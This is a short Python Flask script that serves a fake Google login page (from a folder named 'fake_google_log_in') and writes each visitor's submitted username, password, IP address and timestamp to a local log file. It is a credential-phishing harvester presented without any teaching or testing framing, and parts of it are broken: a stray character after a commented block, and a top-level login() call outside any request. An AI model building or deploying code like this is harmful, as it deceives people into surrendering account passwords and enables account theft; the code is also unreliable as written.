from flask import Flask, request, render_template
from datetime import datetime

google_login_page = Flask(__name__)

@google_login_page.route('/')
def index():
    return render_template("c:/Users/topiary/Documents/fake_google_log_in/templates/google_login_page.html")

@google_login_page.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    user_ip = request.remote_addr

    # Save to file
    with open('miming_logs.txt', 'w') as file:
        file.write(f"Time: {datetime.now()}\n")
        file.write(f"IP: {user_ip}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write("-" * 40 + "\n")

# def save():
#     with open('miming_logs.txt', 'w') as file:
#         file.write(f"Time: {datetime.now()}\n")
#         file.write(f"IP: {user_ip}\n")
#         file.write(f"Username: {username}\n")
#         file.write(f"Password: {password}\n")
#         file.write("-" * 40 + "\n")c


    return render_template("c:/Users/topiary/Documents/fake_google_log_in/templates/google_login_page.html")  # or redirect somewhere else

if __name__ == '__main__':
    google_login_page.run(debug=True)

login()